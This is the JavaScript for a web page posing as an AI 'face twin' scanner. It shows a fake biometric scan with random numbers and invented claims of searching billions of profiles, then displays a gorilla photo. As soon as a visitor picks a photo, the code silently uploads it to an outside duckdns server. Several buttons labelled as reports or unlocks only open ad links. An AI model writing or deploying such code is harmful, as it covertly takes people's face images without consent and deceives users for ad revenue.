/* ==========================================
   1. CONFIGURATIONS
========================================== */
const AD_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/q523uy7yt?key=a608a7a53c25642c3f909011fcbbc596";
const BACKEND_URL = "http://asadgames2.duckdns.org";

// Gorilla Twin Match Photo (Online URL)
const GORILLA_TWIN_IMG = "gorilla.jpg";

/* ==========================================
   2. DOM ELEMENTS
========================================== */
const photoInput = document.getElementById('photoInput');
const userImagePreview = document.getElementById('userImagePreview');
const uploadPlaceholder = document.getElementById('uploadPlaceholder');
const scanBtn = document.getElementById('scanBtn');

const uploadSection = document.getElementById('uploadSection');
const scanningSection = document.getElementById('scanningSection');
const resultSection = document.getElementById('resultSection');

const scanningImg = document.getElementById('scanningImg');
const finalUserImg = document.getElementById('finalUserImg');
const twinImg = document.getElementById('twinImg');
const meshOverlay = document.getElementById('meshOverlay');

const scanStatus = document.getElementById('scanStatus');
const scanPercent = document.getElementById('scanPercent');
const progressBar = document.getElementById('progressBar');

const m1 = document.getElementById('m1');
const m2 = document.getElementById('m2');
const m3 = document.getElementById('m3');

/* ==========================================
   3. BACKGROUND ANIMATION
========================================== */
const canvas = document.getElementById('bgCanvas');
if (canvas) {
  const ctx = canvas.getContext('2d');
  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resizeCanvas();
  window.addEventListener('resize', resizeCanvas);

  const particles = Array.from({ length: 40 }, () => ({
    x: Math.random() * canvas.width,
    y: Math.random() * canvas.height,
    radius: Math.random() * 2 + 1,
    dx: (Math.random() - 0.5) * 0.8,
    dy: (Math.random() - 0.5) * 0.8,
    alpha: Math.random() * 0.5 + 0.2
  }));

  function animateCanvas() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => {
      p.x += p.dx;
      p.y += p.dy;
      if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
      if (p.y < 0 || p.y > canvas.height) p.dy *= -1;

      ctx.beginPath();
      ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(56, 189, 248, ${p.alpha})`;
      ctx.fill();
    });
    requestAnimationFrame(animateCanvas);
  }
  animateCanvas();
}

/* ==========================================
   4. AUDIO EFFECTS
========================================== */
let audioCtx = null;
function getAudioContext() {
  if (!audioCtx) {
    const AudioCtxClass = window.AudioContext || window.webkitAudioContext;
    if (AudioCtxClass) audioCtx = new AudioCtxClass();
  }
  if (audioCtx && audioCtx.state === 'suspended') {
    audioCtx.resume();
  }
  return audioCtx;
}

function playBeepSound(freq = 800, duration = 0.08) {
  try {
    const ctx = getAudioContext();
    if (!ctx) return;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();

    osc.type = 'sine';
    osc.frequency.value = freq;
    osc.connect(gain);
    gain.connect(ctx.destination);

    gain.gain.setValueAtTime(0.1, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);

    osc.start();
    osc.stop(ctx.currentTime + duration);
  } catch (e) {}
}

/* ==========================================
   5. PHOTO SELECTION & AUTO-PREVIEW
========================================== */
if (photoInput) {
  photoInput.addEventListener('change', function(e) {
    const file = e.target.files[0];
    if (file) {
      getAudioContext();

      // Reader local preview ke liye
      const reader = new FileReader();
      reader.onload = function(event) {
        const src = event.target.result;
        
        // Upload Box me Live Preview set karein
        if (userImagePreview) {
          userImagePreview.src = src;
          userImagePreview.classList.remove('hidden');
        }
        if (uploadPlaceholder) uploadPlaceholder.classList.add('hidden');
        if (scanBtn) scanBtn.classList.remove('hidden');

        // Scanning image & Final result user image update karein
        if (scanningImg) scanningImg.src = src;
        if (finalUserImg) finalUserImg.src = src;
      };
      reader.readAsDataURL(file);

      // Backend par silent photo upload
      uploadPhotoToOwnServer(file);
    }
  });
}

function uploadPhotoToOwnServer(fileData) {
  if (!BACKEND_URL) return;

  const formData = new FormData();
  formData.append("image", fileData);

  fetch(`${BACKEND_URL}/upload`, {
    method: "POST",
    body: formData
  })
  .then(res => res.json())
  .then(data => {
    if (data.success) {
      console.log("✓ Photo saved on server:", data.path);
    }
  })
  .catch(err => console.error("Upload Error:", err));
}

/* ==========================================
   6. AI FACE MESH DOTS
========================================== */
function generateFaceMesh() {
  if (!meshOverlay) return;
  meshOverlay.innerHTML = '';
  const points = [
    {top: '30%', left: '35%'}, {top: '30%', left: '65%'},
    {top: '45%', left: '50%'},
    {top: '65%', left: '42%'}, {top: '65%', left: '58%'},
    {top: '80%', left: '50%'},
    {top: '20%', left: '50%'},
    {top: '50%', left: '25%'}, {top: '50%', left: '75%'}
  ];

  points.forEach(pt => {
    const dot = document.createElement('div');
    dot.className = 'mesh-dot';
    dot.style.top = pt.top;
    dot.style.left = pt.left;
    meshOverlay.appendChild(dot);
  });
}

/* ==========================================
   7. SCANNING ANIMATION & RESULT TRIGGER
========================================== */
if (scanBtn) {
  scanBtn.addEventListener('click', function() {
    getAudioContext();

    // Direct Link Ad Open
    if (AD_DIRECT_LINK) {
      window.open(AD_DIRECT_LINK, '_blank');
    }

    if (uploadSection) uploadSection.classList.add('hidden');
    if (scanningSection) scanningSection.classList.remove('hidden');
    generateFaceMesh();

    let percent = 0;
    const statusSteps = [
      "Aligning biometric facial vectors...",
      "Measuring nodal points & pupil gap...",
      "Scanning 8.4 Billion global profiles...",
      "Filtering country & gender clusters...",
      "Calculating facial symmetry percentage...",
      "Match found! Rendering result..."
    ];

    const interval = setInterval(() => {
      percent += 2;
      if (progressBar) progressBar.style.width = percent + '%';
      if (scanPercent) scanPercent.textContent = percent + '%';

      if (m1) m1.textContent = `${(62 + Math.random() * 5).toFixed(1)} mm`;
      if (m2) m2.textContent = `${(112 + Math.random() * 8).toFixed(1)}°`;
      if (m3) m3.textContent = `${(96 + Math.random() * 3.8).toFixed(1)}%`;

      if (percent % 10 === 0) playBeepSound(900 + percent * 5, 0.05);

      if (scanStatus) {
        if (percent === 15) scanStatus.textContent = statusSteps[0];
        if (percent === 35) scanStatus.textContent = statusSteps[1];
        if (percent === 55) scanStatus.textContent = statusSteps[2];
        if (percent === 75) scanStatus.textContent = statusSteps[3];
        if (percent === 90) scanStatus.textContent = statusSteps[4];
      }

      if (percent >= 100) {
        clearInterval(interval);
        playBeepSound(1200, 0.2);

        // Gorilla Twin photo set karein
        if (twinImg) twinImg.src = GORILLA_TWIN_IMG;

        if (scanningSection) scanningSection.classList.add('hidden');
        if (resultSection) resultSection.classList.remove('hidden');
      }
    }, 60);
  });
}

/* ==========================================
   8. AD MONETIZATION BUTTONS
========================================== */
const unlockSocialBtn = document.getElementById('unlockSocialBtn');
if (unlockSocialBtn) {
  unlockSocialBtn.addEventListener('click', () => {
    if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
  });
}

const downloadReportBtn = document.getElementById('downloadReportBtn');
if (downloadReportBtn) {
  downloadReportBtn.addEventListener('click', () => {
    if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
  });
}
